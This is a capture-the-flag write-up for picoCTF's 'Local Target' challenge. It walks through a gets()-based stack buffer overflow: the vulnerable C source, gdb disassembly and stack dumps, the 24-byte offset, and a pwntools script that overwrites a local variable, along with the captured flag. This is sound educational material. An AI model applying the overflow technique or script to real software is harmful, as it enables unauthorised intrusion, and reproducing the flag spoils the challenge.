# Local Target

Smash the stack
Can you overflow the buffer and modify the other local variable? The program is available here. You can view source here. And connect with it using:
`nc saturn.picoctf.net 52915`

Lets examine the source file. 

Source: 
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }
    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);
    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  printf("Bye!\n");
  fflush(stdout);
}
```

We can clearly see the vulnerability `gets`. We can use buffer overflow to modify the variable `num`

Lets use `gdb` to test this out locally. 

Here, we can see the address of the `gets` function. 
```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401236 <+0>:	endbr64
   0x000000000040123a <+4>:	push   rbp
   0x000000000040123b <+5>:	mov    rbp,rsp
   0x000000000040123e <+8>:	sub    rsp,0x20
   0x0000000000401242 <+12>:	mov    DWORD PTR [rbp-0x8],0x40
   0x0000000000401249 <+19>:	lea    rdi,[rip+0xdb4]        # 0x402004
   0x0000000000401250 <+26>:	mov    eax,0x0
   0x0000000000401255 <+31>:	call   0x4010f0 <printf@plt>
   0x000000000040125a <+36>:	mov    rax,QWORD PTR [rip+0x2e0f]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401261 <+43>:	mov    rdi,rax
   0x0000000000401264 <+46>:	call   0x401120 <fflush@plt>
   0x0000000000401269 <+51>:	lea    rax,[rbp-0x20]
   0x000000000040126d <+55>:	mov    rdi,rax
   0x0000000000401270 <+58>:	mov    eax,0x0
   0x0000000000401275 <+63>:	call   0x401110 <gets@plt>
   0x000000000040127a <+68>:	mov    edi,0xa
   0x000000000040127f <+73>:	call   0x4010c0 <putchar@plt>
   0x0000000000401284 <+78>:	mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000401287 <+81>:	mov    esi,eax
   0x0000000000401289 <+83>:	lea    rdi,[rip+0xd85]        # 0x402015
   0x0000000000401290 <+90>:	mov    eax,0x0
   0x0000000000401295 <+95>:	call   0x4010f0 <printf@plt>
   0x000000000040129a <+100>:	mov    rax,QWORD PTR [rip+0x2dcf]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x00000000004012a1 <+107>:	mov    rdi,rax
   0x00000000004012a4 <+110>:	call   0x401120 <fflush@plt>
   0x00000000004012a9 <+115>:	cmp    DWORD PTR [rbp-0x8],0x41
   0x00000000004012ad <+119>:	jne    0x401380 <main+330>
   0x00000000004012b3 <+125>:	lea    rdi,[rip+0xd66]        # 0x402020
   0x00000000004012ba <+132>:	call   0x4010d0 <puts@plt>
   0x00000000004012bf <+137>:	mov    rax,QWORD PTR [rip+0x2daa]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x00000000004012c6 <+144>:	mov    rdi,rax
   0x00000000004012c9 <+147>:	call   0x401120 <fflush@plt>
   0x00000000004012ce <+152>:	lea    rsi,[rip+0xd54]        # 0x402029
   0x00000000004012d5 <+159>:	lea    rdi,[rip+0xd4f]        # 0x40202b
   0x00000000004012dc <+166>:	call   0x401130 <fopen@plt>
   0x00000000004012e1 <+171>:	mov    QWORD PTR [rbp-0x10],rax
   0x00000000004012e5 <+175>:	cmp    QWORD PTR [rbp-0x10],0x0
   0x00000000004012ea <+180>:	jne    0x401311 <main+219>
   0x00000000004012ec <+182>:	lea    rdi,[rip+0xd41]        # 0x402034
   0x00000000004012f3 <+189>:	call   0x4010d0 <puts@plt>
   0x00000000004012f8 <+194>:	mov    rax,QWORD PTR [rip+0x2d71]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x00000000004012ff <+201>:	mov    rdi,rax
   0x0000000000401302 <+204>:	call   0x401120 <fflush@plt>
   0x0000000000401307 <+209>:	mov    edi,0x0
   0x000000000040130c <+214>:	call   0x401140 <exit@plt>
   0x0000000000401311 <+219>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401315 <+223>:	mov    rdi,rax
   0x0000000000401318 <+226>:	call   0x401100 <fgetc@plt>
   0x000000000040131d <+231>:	mov    BYTE PTR [rbp-0x1],al
   0x0000000000401320 <+234>:	jmp    0x40133c <main+262>
   0x0000000000401322 <+236>:	movsx  eax,BYTE PTR [rbp-0x1]
   0x0000000000401326 <+240>:	mov    edi,eax
   0x0000000000401328 <+242>:	call   0x4010c0 <putchar@plt>
   0x000000000040132d <+247>:	mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000401331 <+251>:	mov    rdi,rax
   0x0000000000401334 <+254>:	call   0x401100 <fgetc@plt>
   0x0000000000401339 <+259>:	mov    BYTE PTR [rbp-0x1],al
   0x000000000040133c <+262>:	cmp    BYTE PTR [rbp-0x1],0xff
   0x0000000000401340 <+266>:	jne    0x401322 <main+236>
   0x0000000000401342 <+268>:	mov    rax,QWORD PTR [rip+0x2d27]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401349 <+275>:	mov    rdi,rax
   0x000000000040134c <+278>:	call   0x401120 <fflush@plt>
   0x0000000000401351 <+283>:	mov    edi,0xa
   0x0000000000401356 <+288>:	call   0x4010c0 <putchar@plt>
   0x000000000040135b <+293>:	mov    rax,QWORD PTR [rip+0x2d0e]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401362 <+300>:	mov    rdi,rax
   0x0000000000401365 <+303>:	call   0x401120 <fflush@plt>
   0x000000000040136a <+308>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040136e <+312>:	mov    rdi,rax
   0x0000000000401371 <+315>:	call   0x4010e0 <fclose@plt>
   0x0000000000401376 <+320>:	mov    edi,0x0
   0x000000000040137b <+325>:	call   0x401140 <exit@plt>
   0x0000000000401380 <+330>:	lea    rdi,[rip+0xcbf]        # 0x402046
   0x0000000000401387 <+337>:	call   0x4010d0 <puts@plt>
   0x000000000040138c <+342>:	mov    rax,QWORD PTR [rip+0x2cdd]        # 0x404070 <stdout@@GLIBC_2.2.5>
   0x0000000000401393 <+349>:	mov    rdi,rax
   0x0000000000401396 <+352>:	call   0x401120 <fflush@plt>
   0x000000000040139b <+357>:	mov    eax,0x0
   0x00000000004013a0 <+362>:	leave
   0x00000000004013a1 <+363>:	ret
End of assembler dump.
```

Lets just set break points just before and after the `gets` function, and define a hook-stop to look at the state of the stack during execution of the program. 

```
gef➤  break *0x0000000000401275
Breakpoint 1 at 0x401275
gef➤  break *0x000000000040127a
Breakpoint 2 at 0x40127a
gef➤  define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>info registers
>x/56wx $rsp
>x/2i $rip
>end
```

This is how the stack looks like, just before the `gets` function is executed: 
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb00│+0x0000: 0x0000000000000000	 ← $rsp, $rdi
0x00007fffffffdb08│+0x0008: 0x00007ffff7fe5af0  →  <dl_main+0000> endbr64
0x00007fffffffdb10│+0x0010: 0x00007fffffffdc00  →  0x0000000000401150  →  <_start+0000> endbr64
0x00007fffffffdb18│+0x0018: 0x00007fff00000040 ("@"?)
0x00007fffffffdb20│+0x0020: 0x00007fffffffdbc0  →  0x00007fffffffdc20  →  0x0000000000000000	 ← $rbp
0x00007fffffffdb28│+0x0028: 0x00007ffff7c2a1ca  →  <__libc_start_call_main+007a> mov edi, eax
0x00007fffffffdb30│+0x0030: 0x00007fffffffdb70  →  0x0000000000000000
0x00007fffffffdb38│+0x0038: 0x00007fffffffdc48  →  0x00007fffffffdfdf  →  "/home/haard/Documents/recruitment/haard_phase2/bin[...]"
```

`0x00007fffffffdb18│+0x0018: 0x00007fff00000040 ("@"?)` -> this is what's interesting. 
`0x40` = 64, we need to change this value to `0x41`, which is 65. 

As we can see, the target address is at an offset of `0x0018` -> 24 bytes. 

So, we just need to add 24 bytes of padding and one final payload value. 

Any character passed into the `gets` function, is stored onto the stack in `hex`. So, letter `A` will be converted to `0x41`, which is the required overwrite, to get the flag.   

Lets input 24 bytes of padding and a 25th character `A`. 

This is how the stack looks now: 
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb00│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAA"	 ← $rax, $rsp
0x00007fffffffdb08│+0x0008: "AAAAAAAAAAAAAAAAA"
0x00007fffffffdb10│+0x0010: "AAAAAAAAA"
0x00007fffffffdb18│+0x0018: 0x00007fff00000041 ("A"?)
0x00007fffffffdb20│+0x0020: 0x00007fffffffdbc0  →  0x00007fffffffdc20  →  0x0000000000000000	 ← $rbp
0x00007fffffffdb28│+0x0028: 0x00007ffff7c2a1ca  →  <__libc_start_call_main+007a> mov edi, eax
0x00007fffffffdb30│+0x0030: 0x00007fffffffdb70  →  0x0000000000000000
0x00007fffffffdb38│+0x0038: 0x00007fffffffdc48  →  0x00007fffffffdfdf  →  "/home/haard/Documents/recruitment/haard_phase2/bin[...]"
```

`0x00007fffffffdb18│+0x0018: 0x00007fff00000041 ("A"?)` -> Here, `0x40` has been overwritten to `0x41`. Which is required to get the flag.

On continuing the program, we can see we won. 

```
gef➤  c
Continuing.

num is 65
You win!
```

In order to get the flag, I made a simple python script to connect to the remote server, insert the payload and receive the output. 

Solve script: 
```python
from pwn import * 

p = remote('saturn.picoctf.net', 58903)

payload = b'A'*24
payload += b'A'  # chr(0x41) 

p.sendline(payload)

response = p.recvline()
print(f"{response.decode().strip()}")

print(payload)

p.interactive()
```

Output: 
```
[+] Opening connection to saturn.picoctf.net on port 58903: Done
Enter a string:
b'AAAAAAAAAAAAAAAAAAAAAAAAA'
[*] Switching to interactive mode
num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
[*] Got EOF while reading in interactive
```


flag: `picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}`

